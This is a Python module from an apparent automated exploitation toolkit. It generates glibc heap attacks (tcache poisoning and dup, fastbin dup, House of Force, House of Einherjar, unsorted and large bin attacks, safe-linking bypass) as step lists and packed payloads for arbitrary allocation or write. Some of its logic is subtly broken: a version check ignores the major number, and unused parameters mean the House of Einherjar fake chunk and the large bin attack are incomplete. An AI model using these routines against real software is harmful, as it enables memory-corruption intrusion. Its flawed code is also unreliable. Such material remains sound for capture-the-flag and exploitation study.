"""
Heap exploitation techniques (House of X, tcache attacks, fastbin).
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple

from autopwn.core.binary import Binary
from autopwn.utils.helpers import p64, p32
from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


class HeapTechnique(Enum):
    """Available heap exploitation techniques."""
    TCACHE_POISONING = auto()
    TCACHE_DUP = auto()
    FASTBIN_DUP = auto()
    HOUSE_OF_FORCE = auto()
    HOUSE_OF_SPIRIT = auto()
    HOUSE_OF_LORE = auto()
    HOUSE_OF_EINHERJAR = auto()
    HOUSE_OF_ORANGE = auto()
    UNSORTED_BIN_ATTACK = auto()
    LARGE_BIN_ATTACK = auto()
    SAFE_LINKING_BYPASS = auto()


@dataclass
class HeapExploitConfig:
    """Configuration for heap exploitation."""
    libc_version: str = "2.31"
    has_tcache: bool = True
    has_safe_linking: bool = False  # glibc >= 2.32
    target_address: int = 0
    chunk_size: int = 0x20


class HeapExploiter:
    """
    Heap exploitation technique library.

    Implements techniques from how2heap for various glibc versions.
    """

    def __init__(
        self,
        binary: Binary,
        config: Optional[HeapExploitConfig] = None,
    ):
        """
        Initialize heap exploiter.

        Args:
            binary: Target binary
            config: Exploitation configuration
        """
        self.binary = binary
        self.config = config or HeapExploitConfig()
        self.bits = binary.bits if binary else 64
        self.pack = p64 if self.bits == 64 else p32

    def select_technique(
        self,
        vuln_type: str,
        libc_version: str = "",
    ) -> List[HeapTechnique]:
        """
        Select appropriate technique based on vulnerability and glibc.

        Args:
            vuln_type: Type of vulnerability (uaf, double_free, overflow)
            libc_version: Target glibc version

        Returns:
            List of applicable techniques
        """
        techniques = []

        # Parse version
        major, minor = self._parse_version(libc_version or self.config.libc_version)

        # tcache available in glibc >= 2.26
        has_tcache = major > 2 or (major == 2 and minor >= 26)

        # Safe linking in glibc >= 2.32
        has_safe_linking = major > 2 or (major == 2 and minor >= 32)

        if vuln_type == "uaf":
            if has_tcache:
                techniques.append(HeapTechnique.TCACHE_POISONING)
            techniques.append(HeapTechnique.FASTBIN_DUP)
            techniques.append(HeapTechnique.UNSORTED_BIN_ATTACK)

        elif vuln_type == "double_free":
            if has_tcache:
                techniques.append(HeapTechnique.TCACHE_DUP)
            techniques.append(HeapTechnique.FASTBIN_DUP)

        elif vuln_type == "overflow":
            techniques.append(HeapTechnique.HOUSE_OF_FORCE)
            techniques.append(HeapTechnique.HOUSE_OF_EINHERJAR)
            techniques.append(HeapTechnique.UNSORTED_BIN_ATTACK)

        # Note safe linking requirement
        if has_safe_linking and any(t in techniques for t in [
            HeapTechnique.TCACHE_POISONING,
            HeapTechnique.TCACHE_DUP,
        ]):
            techniques.append(HeapTechnique.SAFE_LINKING_BYPASS)

        return techniques

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 31  # Default

    def tcache_poisoning(
        self,
        target_addr: int,
        heap_leak: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate tcache poisoning exploit.

        Overwrites tcache fd pointer to allocate at arbitrary address.

        Args:
            target_addr: Address to allocate at
            heap_leak: Heap address for safe-linking bypass

        Returns:
            Exploit information
        """
        result = {
            "technique": "tcache_poisoning",
            "steps": [],
            "payload": b"",
            "target": target_addr,
        }

        # Check for safe linking
        if self.config.has_safe_linking:
            # Safe linking: fd = (next ^ (chunk_addr >> 12))
            if heap_leak:
                encrypted_ptr = target_addr ^ (heap_leak >> 12)
                result["payload"] = self.pack(encrypted_ptr)
                result["steps"].append(f"Safe-linking bypass: encrypt pointer")
            else:
                result["steps"].append("WARNING: Need heap leak for safe linking")
                result["payload"] = self.pack(target_addr)
        else:
            result["payload"] = self.pack(target_addr)

        result["steps"].extend([
            "1. Free chunk to tcache",
            "2. Overwrite fd with payload",
            "3. Allocate once (returns original chunk)",
            "4. Allocate again (returns target_addr)",
        ])

        return result

    def tcache_dup(
        self,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate tcache dup exploit (double-free).

        Args:
            target_addr: Address to allocate at

        Returns:
            Exploit information
        """
        result = {
            "technique": "tcache_dup",
            "steps": [
                "1. Allocate chunk A",
                "2. Free chunk A",
                "3. Free chunk A again (double-free)",
                "4. Allocate with payload (overwrites A's fd)",
                f"5. Allocate twice to get chunk at 0x{target_addr:x}",
            ],
            "payload": self.pack(target_addr),
            "target": target_addr,
        }

        # glibc 2.29+ has key check
        major, minor = self._parse_version(self.config.libc_version)
        if major >= 2 and minor >= 29:
            result["steps"].insert(3, "Note: Need to bypass tcache key check (corrupt key)")

        return result

    def fastbin_dup(
        self,
        target_addr: int,
        chunk_size: int = 0x20,
    ) -> Dict[str, Any]:
        """
        Generate fastbin dup exploit.

        Args:
            target_addr: Address to allocate at
            chunk_size: Fastbin chunk size

        Returns:
            Exploit information
        """
        # Ensure valid fastbin size
        if chunk_size > 0x80:
            chunk_size = 0x80

        result = {
            "technique": "fastbin_dup",
            "steps": [
                f"1. Allocate chunk A (size 0x{chunk_size:x})",
                f"2. Allocate chunk B (size 0x{chunk_size:x})",
                "3. Free A",
                "4. Free B",
                "5. Free A again (now: A -> B -> A in fastbin)",
                "6. Allocate and write target address",
                "7. Allocate (gets B)",
                "8. Allocate (gets A)",
                f"9. Allocate (gets target 0x{target_addr:x})",
            ],
            "payload": self.pack(target_addr),
            "chunk_size": chunk_size,
            "target": target_addr,
        }

        # For target_addr allocation, need valid size field
        result["notes"] = f"Target needs valid size field (0x{chunk_size | 1:x})"

        return result

    def house_of_force(
        self,
        target_addr: int,
        top_chunk_addr: int,
        allocation_func: str = "malloc",
    ) -> Dict[str, Any]:
        """
        Generate House of Force exploit.

        Overwrites top chunk size to allocate anywhere.

        Args:
            target_addr: Desired allocation address
            top_chunk_addr: Current top chunk address
            allocation_func: malloc/calloc

        Returns:
            Exploit information
        """
        # Calculate evil size
        header_size = 16 if self.bits == 64 else 8
        evil_size = target_addr - top_chunk_addr - header_size * 2

        result = {
            "technique": "house_of_force",
            "steps": [
                "1. Overflow to overwrite top chunk size with -1 (0xffffffffffffffff)",
                f"2. Calculate evil size: target - top - headers = 0x{evil_size:x}",
                f"3. Allocate evil_size (moves top to target)",
                "4. Next allocation is at target address",
            ],
            "payload": self.pack(0xFFFFFFFFFFFFFFFF if self.bits == 64 else 0xFFFFFFFF),
            "evil_size": evil_size,
            "target": target_addr,
        }

        return result

    def house_of_einherjar(
        self,
        target_addr: int,
        fake_chunk_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate House of Einherjar exploit.

        Exploits backward consolidation with null byte overflow.

        Args:
            target_addr: Desired allocation address
            fake_chunk_addr: Address of fake chunk

        Returns:
            Exploit information
        """
        result = {
            "technique": "house_of_einherjar",
            "steps": [
                "1. Create fake chunk at known address",
                "2. Allocate victim chunk",
                "3. Null byte overflow to clear PREV_INUSE",
                "4. Set prev_size to distance to fake chunk",
                "5. Free victim (consolidates with fake chunk)",
                "6. Next allocation overlaps target",
            ],
            "fake_chunk": self._build_fake_chunk(target_addr, 0x100),
            "target": target_addr,
        }

        return result

    def _build_fake_chunk(self, addr: int, size: int) -> bytes:
        """Build a fake heap chunk."""
        chunk = bytearray(size)

        # prev_size
        chunk[0:8] = self.pack(0)

        # size with PREV_INUSE set
        chunk[8:16] = self.pack(size | 1)

        # fd and bk for unlink
        chunk[16:24] = self.pack(addr)  # fd
        chunk[24:32] = self.pack(addr)  # bk

        return bytes(chunk)

    def unsorted_bin_attack(
        self,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate unsorted bin attack.

        Writes main_arena address to arbitrary location.

        Args:
            target_addr: Where to write

        Returns:
            Exploit information
        """
        result = {
            "technique": "unsorted_bin_attack",
            "steps": [
                "1. Free chunk to unsorted bin",
                "2. Overwrite bk with (target - 0x10)",
                "3. Allocate chunk",
                "4. Target now contains main_arena pointer (libc leak!)",
            ],
            "payload": self.pack(target_addr - 0x10),  # target - offsetof(chunk, fd)
            "target": target_addr,
            "notes": "Writes main_arena+88 to target (useful for leaking libc)",
        }

        return result

    def large_bin_attack(
        self,
        target_addr: int,
        value: int,
    ) -> Dict[str, Any]:
        """
        Generate large bin attack.

        Writes heap address to arbitrary location.

        Args:
            target_addr: Where to write
            value: Value to write (usually heap addr)

        Returns:
            Exploit information
        """
        result = {
            "technique": "large_bin_attack",
            "steps": [
                "1. Free large chunk (size > 0x400)",
                "2. Allocate to move chunk to large bin",
                "3. Modify chunk's bk_nextsize",
                "4. Free another large chunk",
                "5. Target now contains heap pointer",
            ],
            "target": target_addr,
            "notes": "Requires two large chunks and specific size constraints",
        }

        return result

    def safe_linking_decrypt(
        self,
        encrypted_ptr: int,
        chunk_addr: int,
    ) -> int:
        """
        Decrypt safe-linking protected pointer.

        Args:
            encrypted_ptr: Encrypted pointer from heap
            chunk_addr: Address of chunk containing pointer

        Returns:
            Decrypted pointer
        """
        return encrypted_ptr ^ (chunk_addr >> 12)

    def safe_linking_encrypt(
        self,
        ptr: int,
        chunk_addr: int,
    ) -> int:
        """
        Encrypt pointer for safe-linking bypass.

        Args:
            ptr: Pointer to encrypt
            chunk_addr: Address where pointer will be stored

        Returns:
            Encrypted pointer
        """
        return ptr ^ (chunk_addr >> 12)

    def summary(self) -> str:
        """Get exploiter summary."""
        return f"""
Heap Exploiter
==============
Binary: {self.binary.path.name if self.binary else 'None'}
glibc version: {self.config.libc_version}
tcache: {'Yes' if self.config.has_tcache else 'No'}
Safe linking: {'Yes' if self.config.has_safe_linking else 'No'}
"""
